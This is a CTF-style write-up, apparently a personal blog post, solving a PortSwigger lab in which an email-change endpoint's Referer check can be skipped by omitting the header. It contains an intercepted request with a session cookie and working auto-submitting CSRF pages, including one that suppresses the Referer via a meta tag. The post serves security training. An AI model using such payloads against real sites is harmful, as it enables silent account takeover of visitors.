---
layout: post
title: "CSRF where Referer validation depends on the header being present"
date: 2026-10-18
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present){:target="_blank"}'s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Steps

First we intercept the request and notice there's no CSRF token, which means it's vulnerable:

```http
POST /my-account/change-email HTTP/2
Host: 0a47003604e31b5d808e1c1d00410062.web-security-academy.net
Cookie: session=4BCCXIKuPXUhIxNIhwgxm2H2VyfAfQGM
Content-Length: 25
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a47003604e31b5d808e1c1d00410062.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a47003604e31b5d808e1c1d00410062.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i
Connection: keep-alive

email=test2%40example.com
```

We try to change the email with the HTML below:

```html
<h1>Lab 10</h1>

<form name="change-email-form" action="https://0a47003604e31b5d808e1c1d00410062.web-security-academy.net/my-account/change-email" method="GET">
  <input type="hidden" name="email" value="jawad-lab10@example.com">
</form>

<script> document.forms[0].submit(); </script>
```

And we receive `"Invalid referer header"`, meaning the app is using the referrer header as CSRF protection, which can be bypassed.

We notice that if we skip sending the referrer header at all, the exploit works:

```html
<h1>Lab 10</h1>

<meta name="referrer" content="never">

<form name="change-email-form" action="https://0a47003604e31b5d808e1c1d00410062.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="jawad-lab10@example.com">
</form>

<script> document.forms[0].submit(); </script>
```
